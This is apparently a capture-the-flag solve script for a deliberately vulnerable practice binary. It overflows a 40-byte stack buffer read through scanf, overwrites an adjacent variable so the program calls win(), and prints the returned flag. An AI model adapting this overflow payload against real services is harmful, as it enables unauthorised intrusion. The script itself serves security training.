#!/usr/bin/env python3
"""getting-started: stack buffer overflow with scanf("%s"). Overwrite the 8-byte target
at buffer+40 with any value other than 0xdeadbeef, which makes main() call win().

usage: python3 solve.py <ip> <port>
"""
import socket
import sys


def solve(host, port):
    payload = b"A" * 40 + b"B" * 8 + b"\n"  # buffer[0..39] pad, target = 0x4242424242424242
    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(payload)
        out = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    for line in out.decode(errors="replace").splitlines():
        if "HTB{" in line:
            print(line.strip())


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)
    solve(sys.argv[1], int(sys.argv[2]))
